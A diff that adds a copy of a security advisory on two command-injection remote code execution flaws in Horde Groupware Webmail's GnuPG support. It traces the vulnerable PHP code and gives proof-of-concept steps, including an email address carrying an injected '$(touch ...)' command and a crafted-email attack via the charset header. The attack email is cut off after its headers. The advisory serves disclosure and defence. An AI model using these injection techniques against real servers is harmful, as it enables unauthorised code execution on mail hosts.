@@ -1,0 +1,865 @@
+Source: https://blogs.securiteam.com/index.php/archives/3107
+
+Vulnerabilities Summary
+The following advisory describes two (2) vulnerabilities found in
+Horde Groupware Webmail.
+
+Horde Groupware Webmail Edition is a free, enterprise ready, browser
+based communication suite. Users can read, send and organize email
+messages and manage and share calendars, contacts, tasks, notes,
+files, and bookmarks with the standards compliant components from the
+Horde Project. Horde Groupware Webmail Edition bundles the separately
+available applications IMP, Ingo, Kronolith, Turba, Nag, Mnemo,
+Gollem, and Trean.
+
+It can be extended with any of the released Horde applications or the
+applications that are still in development, like a bookmark manager or
+a file manager.
+
+Affected versions: Horde 5, 4 and 3
+
+The vulnerabilities found in Horde Groupware Webmail are:
+
+Authentication Remote Code Execution
+Unauthentication Remote Code Execution
+
+Credit
+An independent security researcher has reported this vulnerability to
+Beyond Security’s SecuriTeam Secure Disclosure program.
+
+Vendor response
+Horde has released a patch to address the vulnerabilities.
+
+For more information:
+https://lists.horde.org/archives/horde/Week-of-Mon-20170403/056767.html
+
+Vulnerabilities Details
+
+Authentication Remote Code Execution
+Horde Webmail contains a vulnerability that allows a remote attacker
+to execute arbitrary code with the privileges of the user who runs the
+web server.
+
+For successful attack GnuPG feature should be enabled on the target
+server (path to gpg binary should be defined in $conf[gnupg][path]
+setting).
+
+Vulnerable code: encryptMessage() function of GPG feature.
+
+Path: /Horde/Crypt/Pgp/Backend/Binary.php:
+
+/* 416 */ public function encryptMessage($text, $params)
+/* 417 */ {
+/* … */
+/* 435 */ foreach (array_keys($params['recips']) as $val) {
+/* 436 */ $cmdline[] = '--recipient ' . $val;
+#! vulnerable code
+/* … */
+/* 444 */ /* Encrypt the document. */
+/* 445 */ $result = $this->_callGpg(
+/* 446 */ $cmdline,
+/* 447 */ 'w',
+/* 448 */ empty($params['symmetric']) ? null : $params['passphrase'],
+/* 449 */ true,
+/* 450 */ true
+/* 451 */ );
+
+$params[‘recips’] will be added to $cmdline array and passed to _callGpg():
+
+Path: /Horde/Crypt/Pgp/Backend/Binary.php:
+
+/* 642 */ public function _callGpg(
+/* 643 */ $options, $mode, $input = array(), $output = false, $stderr = false,
+/* 644 */ $parseable = false, $verbose = false
+/* 645 */ )
+/* 646 */ {
+/* … */
+/* 675 */ $cmdline = implode(' ', array_merge($this->_gnupg, $options));
+/* … */
+/* 681 */ if ($mode == 'w') {
+/* 682 */ if ($fp = popen($cmdline, 'w')) {                        #!
+vulnerable code
+/* … */
+
+We can see that our recipients (addresses) will be in command line
+that is going to be executed. encryptMessage() function can be reached
+by various API, requests. For example it will be called when user try
+to send encrypted message.
+
+Our request for encryption and sending our message will be processed
+by buildAndSendMessage() method:
+Path: /imp/lib/Compose.php
+
+/* 733 */ public function buildAndSendMessage(
+/* 734 */ $body, $header, IMP_Prefs_Identity $identity, array $opts = array()
+/* 735 */ )
+/* 736 */ {
+/* 737 */ global $conf, $injector, $notification, $prefs, $registry, $session;
+/* 738 */
+/* 739 */ /* We need at least one recipient & RFC 2822 requires that no 8-bit
+/* 740 */ * characters can be in the address fields. */
+/* 741 */ $recip = $this->recipientList($header);
+/* ... */
+/* 793 */ /* Must encrypt & send the message one recipient at a time. */
+/* 794 */ if ($prefs->getValue('use_smime') &&
+/* 795 */ in_array($encrypt, array(IMP_Crypt_Smime::ENCRYPT,
+IMP_Crypt_Smime::SIGNENC))) {
+/* ... */
+/* 807 */ } else {
+/* 808 */ /* Can send in clear-text all at once, or PGP can encrypt
+/* 809 */ * multiple addresses in the same message. */
+/* 810 */ $msg_options['from'] = $from;
+/* 811 */ $save_msg = $this->_createMimeMessage($recip['list'], $body,
+$msg_options);        #! vulnerable code
+
+In line 741 it tries to create recipient list: Horde parsers values of
+‘to’, ‘cc’, ‘bcc’ headers and creates list of Rfc822 addresses. In
+general there are restrictions for characters in addresses but if we
+will use the next format:
+
+display-name <"somemailbox"@somedomain.com>
+
+somemailbox will be parsed by _rfc822ParseQuotedString() method:
+
+Path: /Horde/Mail/Rfc822.php:
+
+/* 557 */ protected function _rfc822ParseQuotedString(&$str)
+/* 558 */ {
+/* 559 */ if ($this->_curr(true) != '"') {
+/* 560 */ throw new Horde_Mail_Exception('Error when parsing a quoted string.');
+/* 561 */ }
+/* 563 */ while (($chr = $this->_curr(true)) !== false) {
+/* 564 */ switch ($chr) {
+/* 565 */ case '"':
+/* 566 */ $this->_rfc822SkipLwsp();
+/* 567 */ return;
+/* 569 */ case "\n":
+/* 570 */ /* Folding whitespace, remove the (CR)LF. */
+/* 571 */ if (substr($str, -1) == "\r") {
+/* 572 */ $str = substr($str, 0, -1);
+/* 573 */ }
+/* 574 */ continue;
+/* 576 */ case '\\':
+/* 577 */ if (($chr = $this->_curr(true)) === false) {
+/* 578 */ break 2;
+/* 579 */ }
+/* 580 */ break;
+/* 581 */ }
+/* 583 */ $str .= $chr;
+/* 584 */ }
+/* 586 */ /* Missing trailing '"', or partial quoted character. */
+/* 587 */ throw new Horde_Mail_Exception('Error when parsing a quoted string.');
+/* 588 */ }
+
+There are only a few limitations:
+
+we cannot use “
+\n will be deleted
+we cannot use \ at the end of our mailbox
+
+After creation of recipient list buildAndSendMessage() will call
+_createMimeMessage():
+
+Path: /imp/lib/Compose.php
+
+/* 1446 */ protected function _createMimeMessage(
+/* 1447 */ Horde_Mail_Rfc822_List $to, $body, array $options = array()
+/* 1448 */ )
+/* 1449 */ {
+/* 1450 */ global $conf, $injector, $prefs, $registry;
+/* ... */
+/* 1691 */ /* Set up the base message now. */
+/* 1692 */ $encrypt = empty($options['encrypt'])
+/* 1693 */ ? IMP::ENCRYPT_NONE
+/* 1694 */ : $options['encrypt'];
+/* 1695 */ if ($prefs->getValue('use_pgp') &&
+/* 1696 */ !empty($conf['gnupg']['path']) &&
+/* 1697 */ in_array($encrypt, array(IMP_Crypt_Pgp::ENCRYPT,
+IMP_Crypt_Pgp::SIGN, IMP_Crypt_Pgp::SIGNENC,
+IMP_Crypt_Pgp::SYM_ENCRYPT, IMP_Crypt_Pgp::SYM_SIGNENC))) {
+/* 1698 */ $imp_pgp = $injector->getInstance('IMP_Crypt_Pgp');
+/* ... */
+/* 1727 */ /* Do the encryption/signing requested. */
+/* 1728 */ try {
+/* 1729 */ switch ($encrypt) {
+/* ... */
+/* 1735 */ case IMP_Crypt_Pgp::ENCRYPT:
+/* 1736 */ case IMP_Crypt_Pgp::SYM_ENCRYPT:
+/* 1737 */ $to_list = clone $to;
+/* 1738 */ if (count($options['from'])) {
+/* 1739 */ $to_list->add($options['from']);
+/* 1740 */ }
+/* 1741 */ $base = $imp_pgp->IMPencryptMIMEPart($base, $to_list,
+($encrypt == IMP_Crypt_Pgp::SYM_ENCRYPT) ?
+$symmetric_passphrase : null);
+/* 1742 */ break;
+
+Here we can see validation (1695-1696 lines) that:
+
+Current user has enabled “use_pgp” feature in his preferences (it is
+not a problem as an attacker can edit his own preferences)
+$conf[‘gnupg’][‘path’] is not empty. This value can be edited only by
+admin. So if we don’t have value here our server is not vulnerable.
+But if admin wants to allow users to use GPG feature he/she needs to
+define value for this config.
+
+Also we can see that in lines 1737-1739 to our recipient list will be
+added address “from” as well.
+
+Path: /imp/lib/Crypt/Pgp.php
+
+/* 584 */ public function impEncryptMimePart($mime_part,
+/* 585 */ Horde_Mail_Rfc822_List $addresses,
+/* 586 */ $symmetric = null)
+/* 587 */ {
+/* 588 */ return $this->encryptMimePart($mime_part,
+$this->_encryptParameters($addresses, $symmetric));
+/* 589 */ }
+
+Before encryptMimePart() call Horde uses _encryptParameters()
+
+Path: /imp/lib/Crypt/Pgp.php
+
+/* 536 */ protected function _encryptParameters(Horde_Mail_Rfc822_List
+$addresses,
+/* 537 */ $symmetric)
+/* 538 */ {
+/* ... */
+/* 546 */ $addr_list = array();
+/* 548 */ foreach ($addresses as $val) {
+/* 549 */ /* Get the public key for the address. */
+/* 550 */ $bare_addr = $val->bare_address;
+/* 551 */ $addr_list[$bare_addr] = $this->getPublicKey($bare_addr);
+/* 552 */ }
+/* 554 */ return array('recips' => $addr_list);
+/* 555 */ }
+
+Horde will add to each address its Public Key. There a few source of
+Public Keys:
+
+AddressBook (we will use this source)
+Servers with Public Keys
+
+Note that Horde should be able to find Public Key for our “From”
+address as well.
+We can generate pair of PGP keys (https is required) or we can use the
+same trick with AddressBook (we can create some contact, add any valid
+Public PGP key, and add this address to default identity)
+encryptMimePart() will call encrypt() method
+
+Path: /Horde/Crypt/Pgp.php
+
+/* 773 */ public function encryptMIMEPart($mime_part, $params = array())
+/* 774 */ {
+/* 775 */ $params = array_merge($params, array('type' => 'message'));
+/* … */
+/* 781 */ $message_encrypt = $this->encrypt($signenc_body, $params);
+
+It will call encryptMessage()
+
+Path: /Horde/Crypt/Pgp.php
+
+/* 554 */ public function encrypt($text, $params = array())
+/* 555 */ {
+/* 556 */ switch (isset($params['type']) ? $params['type'] : false) {
+/* 557 */ case 'message':
+/* 558 */ $error = Horde_Crypt_Translation::t(
+/* 559 */ "Could not PGP encrypt message."
+/* 560 */ );
+/* 561 */ $func = 'encryptMessage';
+/* 562 */ break;
+/* ... */
+/* 586 */ $this->_initDrivers();
+/* 587 */
+/* 588 */ foreach ($this->_backends as $val) {
+/* 589 */ try {
+/* 590 */ return $val->$func($text, $params);
+/* 591 */ } catch (Horde_Crypt_Exception $e) {}
+/* 592 */ }
+
+In conclusions:
+If Horde server has enabled “GnuPG feature” any unprivileged user is
+able to execute arbitrary code.
+
+Enable GPG feature for attacker account (“Enable PGP functionality?”
+checkbox on “PGP Configure PGP encryption support.” section in
+Prefferences->Mail page )
+Create some contact in the attacker AddressBook, add any valid Public
+PGP key, and add this address to default identity
+Create another contact in the attacker AddressBook, add any valid
+Public PGP key, and change email address to some$(desired command to
+execute) contact@somedomain.com
+Create a new message to some$(desired command to execute) contact@somedomain.com
+Choose Encryption:PGP Encrypt Message option
+Click Send button
+
+And desired command will be executed on the Horde server.
+
+Proof of Concept – Authenticated Code Execution
+
+For Proof of Concept we can use preconfigured image of Horde server
+from Bitnami (Bitnami – “Easy to use cloud images, containers, and VMs
+that work on any platform”):
+
+https://downloads.bitnami.com/files/stacks/horde/5.2.17-0/bitnami-horde-5.2.17-0-linux-ubuntu-14.04-x86_64.ova
+
+Step 1 – Login as admin (by default user:bitnami) and go to
+Administration -> Configuration and choose Horde (horde). Open GnuPG
+tab, enter /usr/bin/gpg into $conf[gnupg][path] setting and click
+“Generate Horde Configuration“:
+
+Now we have enabled GPG feature on our server and we can login as
+regular user and try to execute desired commands. But Bitnami image
+does not have installed and configured Mail server so we need to use
+external one or install it on local machine.
+
+We will use gmail account (to be able to login to it from Horde I had
+to change Gmail account setting Allow less secure apps: ON).
+
+To use external Mail server we need to change the next setting:
+“Administrator Panel” -> “Configuration” -> “Horde” ->
+“Authentication”
+
+Step 2 – Configure Horde web-mail authentication ($conf[auth][driver])
+to “Let a Horde application handle authentication” and click “Generate
+Horde Configuration”:
+
+Step 3 – logout and login with your gmail account. Currently we are
+login as regular user so we can try to execute desired commands:
+
+Go to Preferences -> Mail and click on PGP link. Check Enable PGP
+functionality? checkbox and click “Save”:
+
+Create “from” contact in our AddressBook: “Address Book -> New Contact
+-> in Address Book of …”
+
+Personal tab – Last Name: mymailboxwithPGPkey
+Communication tab – Email: mymailboxwihPGP@any.com
+Other tab – PGP Public Key: any valid Public PGP key.
+
+For example:
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: SKS 1.1.6
+Comment: Hostname: keyserver.ubuntu.com
+mQGiBDk89iARBADhB7AyHQ/ZBlZjRRp1/911XaXGGmq1LDLTUTCAbJyQ1TzKDdetfT9Szk01
+YPdAnovgzxTS89svuVHP/BiqLqhJMl2FfMLcJX+va+DujGuLDCZDHi+4czc33N3z8ArpxzPQ
+5bfALrpNMJi6v2gZkDQAjMoeKrNEfXLCXQbTYWCuhwCgnZZCThya4xhmlLCTkwsQdMjFoj8D
+/iOIP/6W27opMJgZqTHcisFPF6Kqyxe6GAftJo6ZtLEG26k2Qn3O0pghDz2Ql4aDVki3ms82
+z77raSqbZVJzAFPzYoIKuc3JOoxxE+SelzSzj4LuQRXYKqZzT8/qYBCLg9cmhdm8PnwE9fd/
+POGnNQFMk0i2xSz0FMr9R1emIKNsA/454RHIZ39ebvZzVULS1pSo6cI7DAJFQ3ejJqEEdAbr
+72CW3eFUAdF+4bJQU/V69Nr+CmziBbyqKP6HfiUH9u8NLrYuK6XWXLVVSCBPsOxHxhw48hch
+zVxJZ5Cyo/tMSOY/CxvLL/vMoT2+kQX1SCsWALosKJyOGbpCJmPasOLKdrQnQWxpY2UgKFJl
+Y2h0c2Fud8OkbHRpbikgPGFsaWNlQGN5Yi5vcmc+iEYEEBECAAYFAjk+IEgACgkQzDSD4hsI
+fQSaWQCgiDvvnRxa8XFOKy/NI7CKL5X4D28An2k9Cbh+dosXvB5zGCuQiAkLiQ+CiEYEEREC
+AAYFAkKTPFcACgkQCY+3LE2/Ce4l+gCdFSHqp5HQCMKSOkLodepoG0FiQuwAnR2nioCQ3A5k
+YI0NfUth+0QzJs1ciFYEExECABYFAjk89iAECwoEAwMVAwIDFgIBAheAAAoJEFsqCm37V5ep
+fpAAoJezEplLlaGQHM8ppKReVHSyGuX+AKCYwRcwJJwoQHM8p86xhSuC/opYPoheBBMRAgAW
+BQI5PPYgBAsKBAMDFQMCAxYCAQIXgAASCRBbKgpt+1eXqQdlR1BHAAEBfpAAoJezEplLlaGQ
+HM8ppKReVHSyGuX+AKCYwRcwJJwoQHM8p86xhSuC/opYPrkBDQQ5PPYqEAQArSW27DriJAFs
+Or+fnb3VwsYvznFfEv8NJyM/9/lDYfIROHIhdKCWswUWCgoz813RO2taJi5p8faM048Vczu/
+VefTzVrsvpgXUIPQoXjgnbo6UCNuLqGk6TnwdJPPNLuIZLBEhGdA+URtFOA5tSj67h0G4fo0
+P8xmsUXNgWVxX/MAAwUD/jUPLFgQ4ThcuUpxCkjMz+Pix0o37tOrFOU/H0cn9SHzCQKxn+iC
+sqZlCsR+qXNDl43vSa6Riv/aHtrD+MJLgdIVkufuBWOogtuojusnFGY73xvvM1MfbG+QaUqw
+gfe4UYOchLBNVtfN3WiqSPq5Yhue4m1u/xIvGGJQXvSBxNQyiEYEGBECAAYFAjk89ioACgkQ
+WyoKbftXl6kV5QCfV7GjnmicwJPgxUQbDMP9u5KuVcsAn3aSmYyI1u6RRlKoThh0WEHayISv
+iE4EGBECAAYFAjk89ioAEgkQWyoKbftXl6kHZUdQRwABARXlAJ9XsaOeaJzAk+DFRBsMw/27
+kq5VywCfdpKZjIjW7pFGUqhOGHRYQdrIhK8=
+=RHjX
+-----END PGP PUBLIC KEY BLOCK-----
+
+Click “Add” button:
+
+Go to Preferences -> Global Preferences and click on Personal
+Information link. Put mymailboxwihPGP@any.com into field The default
+e-mail address to use with this identity and Click “Save”:
+
+Create our “to” contact in our AddressBook: “Address Book -> New
+Contact -> in Address Book of …”
+
+Personal tab – Last Name: contact_for_attack
+Communication tab – Email: hereinj@any.com
+Other tab – PGP Public Key: any valid Public PGP key (it can be the
+same as in the previous step)
+And click “Add” button:
+
+Inject our command: Click on Edit. Go to Communication Tab, put cursor
+in Email field and chose “Inspect Element (Q)” from context menu:
+
+Delete “email” from the type argument and close Inspector:
+
+1
+<input name="object[email]" id="object_email_" value="hereinj@any.com"
+type="email">
+
+Edit the address as we want – for example hereinj$(touch
+/tmp/hereisvuln)@any.com and click “Save”:
+
+Create a new message ( Mail -> New Message) with our contact as recipient:
+
+Choose PGP Encrypt Message in Encryption option:
+
+Enter any subject and any content. Click “Send”
+
+We will get “PGP Error:…”
+
+It is ok – let’s check our server:
+
+We have a new file “hereisvuln” so our command was executed.
+
+Unauthentication Remote Code Execution
+Horde Webmail contains a vulnerability that allows a remote attacker
+to execute arbitrary code with the privileges of the user who runs the
+web server.
+
+Vulnerable code: decryptSignature() function of GPG feature.
+
+Path: /Horde/Crypt/Pgp/Backend/Binary.php:
+
+/* 539 */ public function decryptSignature($text, $params)
+/* 540 */ {
+/* ... */
+/* 550 */ /* Options for the GPG binary. */
+/* 551 */ $cmdline = array(
+/* 552 */ '--armor',
+/* 553 */ '--always-trust',
+/* 554 */ '--batch',
+/* 555 */ '--charset ' . (isset($params['charset']) ?
+$params['charset'] : 'UTF-8'),
+/* 556 */ $keyring,
+/* 557 */ '--verify'
+/* 558 */ );
+/* ... */
+/* 571 */ $result = $this->_callGpg($cmdline, 'r', null, true, true, true);
+/* ... */
+
+$params[‘charset’] will be added to $cmdline array and passed to _callGpg():
+
+/* 642 */ public function _callGpg(
+/* 643 */ $options, $mode, $input = array(), $output = false, $stderr = false,
+/* 644 */ $parseable = false, $verbose = false
+/* 645 */ )
+/* 646 */ {
+/* … */
+/* 675 */ $cmdline = implode(' ', array_merge($this->_gnupg, $options));
+/* … */
+/* 681 */ if ($mode == 'w') {
+/* … */
+/* 704 */ } elseif ($mode == 'r') {
+/* 705 */ if ($fp = popen($cmdline, 'r')) {
+/* … */
+
+Our $params[‘charset’] will be in command line that is going to be executed.
+
+decryptSignature() is called from decrypt() method:
+
+Path – /Horde/Crypt/Pgp.php:
+
+/* 611 */ public function decrypt($text, $params = array())
+/* 612 */ {
+/* 613 */ switch (isset($params['type']) ? $params['type'] : false) {
+/* 614 */ case 'detached-signature':
+/* 615 */ case 'signature':
+/* 616 */ /* Check for required parameters. */
+/* 617 */ if (!isset($params['pubkey'])) {
+/* 618 */ throw new InvalidArgumentException(
+/* 619 */ 'A public PGP key is required to verify a signed message.'
+/* 620 */ );
+/* 621 */ }
+/* 622 */ if (($params['type'] === 'detached-signature') &&
+/* 623 */ !isset($params['signature'])) {
+/* 624 */ throw new InvalidArgumentException(
+/* 625 */ 'The detached PGP signature block is required to verify the
+signed message.'
+/* 626 */ );
+/* 627 */ }
+/* 628 */
+/* 629 */ $func = 'decryptSignature';
+/* 630 */ break;
+/* ... */
+/* 650 */ $this->_initDrivers();
+/* 651 */
+/* 652 */ foreach ($this->_backends as $val) {
+/* 653 */ try {
+/* 654 */ return $val->$func($text, $params);
+/* 655 */ } catch (Horde_Crypt_Exception $e) {}
+/* 656 */ }
+/* ... */
+
+decrypt() with needed parameters is used in verifySignature():
+
+Path – /imp/lib/Crypt/Pgp.php
+
+/* 339 */ public function verifySignature($text, $address, $signature = '',
+/* 340 */ $charset = null)
+/* 341 */ {
+/* 342 */ if (!empty($signature)) {
+/* 343 */ $packet_info = $this->pgpPacketInformation($signature);
+/* 344 */ if (isset($packet_info['keyid'])) {
+/* 345 */ $keyid = $packet_info['keyid'];
+/* 346 */ }
+/* 347 */ }
+/* 349 */ if (!isset($keyid)) {
+/* 350 */ $keyid = $this->getSignersKeyID($text);
+/* 351 */ }
+/* 353 */ /* Get key ID of key. */
+/* 354 */ $public_key = $this->getPublicKey($address, array('keyid' => $keyid));
+/* 356 */ if (empty($signature)) {
+/* 357 */ $options = array('type' => 'signature');
+/* 358 */ } else {
+/* 359 */ $options = array('type' => 'detached-signature', 'signature'
+=> $signature);
+/* 360 */ }
+/* 361 */ $options['pubkey'] = $public_key;
+/* 363 */ if (!empty($charset)) {
+/* 364 */ $options['charset'] = $charset;
+/* 365 */ }
+/* 369 */ return $this->decrypt($text, $options);
+/* 370 */ }
+
+verifySignature() is called from _outputPGPSigned():
+
+Path – /imp/lib/Mime/Viewer/Pgp.php
+
+/* 387 */ protected function _outputPGPSigned()
+/* 388 */ {
+/* 389 */ global $conf, $injector, $prefs, $registry, $session;
+/* 390 */
+/* 391 */ $partlist = array_keys($this->_mimepart->contentTypeMap());
+/* 392 */ $base_id = reset($partlist);
+/* 393 */ $signed_id = next($partlist);
+/* 394 */ $sig_id = Horde_Mime::mimeIdArithmetic($signed_id, 'next');
+/* 395 */
+/* 396 */ if (!$prefs->getValue('use_pgp') || empty($conf['gnupg']['path'])) {
+/* 397 */ return array(
+/* 398 */ $sig_id => null
+/* 399 */ );
+/* 400 */ }
+/* ... */
+/* 417 */ if ($prefs->getValue('pgp_verify') ||
+/* 418 */ $injector->getInstance('Horde_Variables')->pgp_verify_msg) {
+/* 419 */ $imp_contents = $this->getConfigParam('imp_contents');
+/* 420 */ $sig_part = $imp_contents->getMIMEPart($sig_id);
+/* ... */
+/* 433 */ try {
+/* 434 */ $imp_pgp = $injector->getInstance('IMP_Crypt_Pgp');
+/* 435 */ if ($sig_raw =
+$sig_part->getMetadata(Horde_Crypt_Pgp_Parse::SIG_RAW)) {
+/* 436 */ $sig_result = $imp_pgp->verifySignature($sig_raw,
+$this->_getSender()->bare_address, null, $sig_part-
+> getMetadata(Horde_Crypt_Pgp_Parse::SIG_CHARSET));
+/* ... */
+
+And it is used in _renderInline():
+
+Path – /imp/lib/Mime/Viewer/Pgp.php
+
+/* 134 */ protected function _renderInline()
+/* 135 */ {
+/* 136 */ $id = $this->_mimepart->getMimeId();
+/* 138 */ switch ($this->_mimepart->getType()) {
+/* ... */
+/* 142 */ case 'multipart/signed':
+/* 143 */ return $this->_outputPGPSigned();
+
+Let’s go back to _outputPGPSigned() method. We can see a few
+requirements before the needed call:
+
+$conf[‘gnupg’][‘path’] should be not empty. This value can be edited
+only by admin(if he/she wants to allow users to use GPG feature he/she
+needs to define value for this config).
+Current user has enabled “use_pgp” feature in his preferences
+Current user has enabled “pgp_verify” feature in his preferences
+Current user has enabled “pgp_verify” feature in his preferences
+
+Also we see that our charset value is taken from $sig_part ->
+getMetadata(Horde_Crypt_Pgp_Parse::SIG_CHARSET)
+
+Our value will be stored during parsing of PGP parts:
+
+Path – /Horde/Crypt/Pgp/Parse.php
+
+/* 150 */ public function parseToPart($text, $charset = 'UTF-8')
+/* 151 */ {
+/* 152 */ $parts = $this->parse($text);
+/* ... */
+/* 162 */ while (list(,$val) = each($parts)) {
+/* 163 */ switch ($val['type']) {
+/* ... */
+/* 200 */ case self::ARMOR_SIGNED_MESSAGE:
+/* 201 */ if ((list(,$sig) = each($parts)) &&
+/* 202 */ ($sig['type'] == self::ARMOR_SIGNATURE)) {
+/* 203 */ $part = new Horde_Mime_Part();
+/* 204 */ $part->setType('multipart/signed');
+/* 205 */ // TODO: add micalg parameter
+/* 206 */ $part->setContentTypeParameter('protocol',
+'application/pgp-signature');
+/* 207 */
+/* 208 */ $part1 = new Horde_Mime_Part();
+/* 209 */ $part1->setType('text/plain');
+/* 210 */ $part1->setCharset($charset);
+/* 211 */
+/* 212 */ $part1_data = implode("\n", $val['data']);
+/* 213 */ $part1->setContents(substr($part1_data, strpos($part1_data,
+"\n\n") + 2));
+/* 214 */
+/* 215 */ $part2 = new Horde_Mime_Part();
+/* 216 */
+/* 217 */ $part2->setType('application/pgp-signature');
+/* 218 */ $part2->setContents(implode("\n", $sig['data']));
+/* 219 */
+/* 220 */ $part2->setMetadata(self::SIG_CHARSET, $charset);
+/* 221 */ $part2->setMetadata(self::SIG_RAW, implode("\n",
+$val['data']) . "\n" . implode("\n", $sig['data']));
+/* 222 */
+/* 223 */ $part->addPart($part1);
+/* 224 */ $part->addPart($part2);
+/* 225 */ $new_part->addPart($part);
+/* 226 */
+/* 227 */ next($parts);
+/* 228 */ }
+/* 229 */ }
+/* 230 */ }
+/* 231 */
+/* 232 */ return $new_part;
+/* 233 */ }
+
+It is called from _parsePGP():
+
+Path – /imp/lib/Mime/Viewer/Plain.php
+
+×
+1
+2
+3
+4
+5
+6
+7
+8
+/* 239 */ protected function _parsePGP()
+/* 240 */ {
+/* 241 */ $part =
+$GLOBALS['injector']->getInstance('Horde_Crypt_Pgp_Parse')->parseToPart(
+/* 242 */ new Horde_Stream_Existing(array(
+/* 243 */ 'stream' => $this->_mimepart->getContents(array('stream' => true))
+/* 244 */ )),
+/* 245 */ $this->_mimepart->getCharset()
+/* 246 */ );
+
+Our charset value is taken from CHARSET attribute of Content-Type
+header of parent MIMEpart.
+
+_parsePGP() is used in _getEmbeddedMimeParts() method and from Horde
+Webmail ver 5.2.0 it looks like:
+
+Path – /imp/lib/Mime/Viewer/Plain.php
+
+/* 222 */ protected function _getEmbeddedMimeParts()
+/* 223 */ {
+/* 224 */ $ret = $this->getConfigParam('pgp_inline')
+/* 225 */ ? $this->_parsePGP()
+/* 226 */ : null;
+
+We can see an additional requirement – our function will be called
+only if ‘pgp_inline‘ config parameter is “true”. It is defined in:
+
+Path – /imp/config/mime_drivers.php
+
+/* 37 */ /* Scans the text for inline PGP data. If true, will strip this data
+/* 38 */ * out of the output (and, if PGP is active, will display the
+/* 39 */ * results of the PGP action). */
+/* 40 */ 'pgp_inline' => false
+
+Default value is false, so the major part of Horde servers is not
+vulnerable and our attack is relevant only if an admin manually has
+changed this line to ‘pgp_inline‘ => true.
+
+But in older versions (before 5.2.0) the code of
+_getEmbeddedMimeParts() is a bit different:
+
+Path – /imp/lib/Mime/Viewer/Plain.php
+
+/* 227 */ protected function _getEmbeddedMimeParts()
+/* 228 */ {
+/* 229 */ $ret = null;
+/* 230 */
+/* 231 */ if (!empty($GLOBALS['conf']['gnupg']['path']) &&
+/* 232 */ $GLOBALS['prefs']->getValue('pgp_scan_body')) {
+/* 233 */ $ret = $this->_parsePGP();
+/* 234 */ }
+
+So instead of requirement to have config parameter we have requirement
+of ‘pgp_scan_body‘ Preference of current user. And it is more likely
+to find a victim with needed preferences. We saw where our injected
+command is executed and from where and when it is taken
+
+During rendering of massage we:
+
+Will parse PGP values:
+
+#0 IMP_Mime_Viewer_Plain->_parsePGP() called at
+[/imp/lib/Mime/Viewer/Plain.php:225]
+#1 IMP_Mime_Viewer_Plain->_getEmbeddedMimeParts() called at
+[/Horde/Mime/Viewer/Base.php:298]
+#2 Horde_Mime_Viewer_Base->getEmbeddedMimeParts() called at
+[/imp/lib/Contents.php:1114]
+#3 IMP_Contents->_buildMessage() called at [/imp/lib/Contents.php:1186]
+#4 IMP_Contents->getContentTypeMap() called at [/imp/lib/Contents.php:1423]
+#5 IMP_Contents->getInlineOutput() called at
+[/imp/lib/Ajax/Application/ShowMessage.php:296]
+
+Will use them in:
+
+#0 IMP_Mime_Viewer_Plain->_parsePGP() called at
+[/imp/lib/Mime/Viewer/Plain.php:225]
+#0 IMP_Mime_Viewer_Pgp->_renderInline() called at
+[/Horde/Mime/Viewer/Base.php:156]
+#1 Horde_Mime_Viewer_Base->render() called at [/Horde/Mime/Viewer/Base.php:207]
+#2 Horde_Mime_Viewer_Base->_renderInline() called at
+[/Horde/Mime/Viewer/Base.php:156]
+#3 Horde_Mime_Viewer_Base->render() called at [/imp/lib/Contents.php:654]
+#4 IMP_Contents->renderMIMEPart() called at [/imp/lib/Contents.php:1462]
+#5 IMP_Contents->getInlineOutput() called at
+[/imp/lib/Ajax/Application/ShowMessage.php:296]]
+
+In conclusions:
+
+If Horde server has vulnerable configuration:
+
+Enabled “GnuPG feature” (there is path to gpg binary in
+$conf[gnupg][path] setting)
+Only for ver 5.2.0 and newer: ‘pgp_inline’ => true, in
+/imp/config/mime_drivers.php
+
+And the victim has checked the next checkbox in his/her preferences (
+“PGP Configure PGP encryption support.” in Prefferences->Mail) :
+
+“Enable PGP functionality”
+“Should PGP signed messages be automatically verified when viewed?” if
+it is not checked our command will be executed when the victim clicks
+on the link “Click HERE to verify the message.”
+For versions before 5.2.0: “Should the body of plaintext message be
+scanned for PGP data”
+
+An attacker can create email with PGP data, put desired command into
+CHARSET attribute of ContentType header, and this command will be
+executed on Horde server when the victim opens this email.
+
+Proof of Concept – Remote Code Execution
+
+For Proof of Concept we can use preconfigured image of Horde server
+from Bitnami (Bitnami – “Easy to use cloud images, containers, and VMs
+that work on any platform”):
+
+https://downloads.bitnami.com/files/stacks/horde/5.2.17-0/bitnami-horde-5.2.17-0-linux-ubuntu-14.04-x86_64.ova
+
+Step 1 – Login as admin (by default user:bitnami) and go to
+Administration -> Configuration and choose Horde (horde). Open GnuPG
+tab, enter /usr/bin/gpg into $conf[gnupg][path] setting and click
+“Generate Horde Configuration“:
+
+Now we have enabled GPG feature on our server and we can login as
+regular user and try to execute desired commands. But Bitnami image
+does not have installed and configured Mail server so we need to use
+external one or install it on local machine.
+
+We will use gmail account (to be able to login to it from Horde I had
+to change Gmail account setting Allow less secure apps: ON).
+
+To use external Mail server we need to change the next setting:
+“Administrator Panel” -> “Configuration” -> “Horde” ->
+“Authentication”
+
+Configure the application authentication ($conf[auth][driver]) –
+change this option to “Let a Horde application handle authentication”
+and click “Generate Horde Configuration”.
+
+If we have Horde Webmail ver 5.2.0 or newer we need to edit
+/imp/config/mime_drivers.php file. Login to the console of bitnami
+image (default bitnami:bitnami) and run the next command:
+
+sudo nano /opt/bitnami/apps/horde/htdocs/imp/config/mime_drivers.php
+
+Change the line: “‘pgp_inline’ => false” to “‘pgp_inline’ => true” and
+save the changes.
+
+Step 2 – Logout and login with your gmail account.
+
+Step 3 – Go to Preferences -> Mail and click on PGP link:
+
+Check Enable PGP functionality checkbox and click “Save”
+Check Should PGP signed messages be automatically verified when viewed checkbox
+For versions before 5.2.0 check “Should the body of plain-text message
+be scanned for PGP data” checkbox Click “Save”
+
+For version before 5.2.0:
+
+Step 4 – Go to the Mail, take any mail folder (for example Drafts),
+and chose “Import” item from context menu and import attack_whoami.eml
+file (in the end of this blog).
+
+Click on the imported email:
+
+Our Horde serve is launched under daemon user
+
+Step 5 – We can do the same with attack_touch.eml (in the end of this
+blog) file (import it and click on the new mail) and check /tmp
+folder:
+
+attack_touch.eml
+
+Date: Fri, 04 Nov 2016 16:04:19 +0000
+Message-ID: <20161104160419.Horde.HpYObg_3-4QS-nUzWujEkg3@ubvm.mydomain.com>
+From: Donald Trump <attacker@attacker.com>
+To: SomeUser@mydoamin.com
+Subject: PGP_INLine_touch_tmp_youarevuln
+X-IMP-Draft: Yes
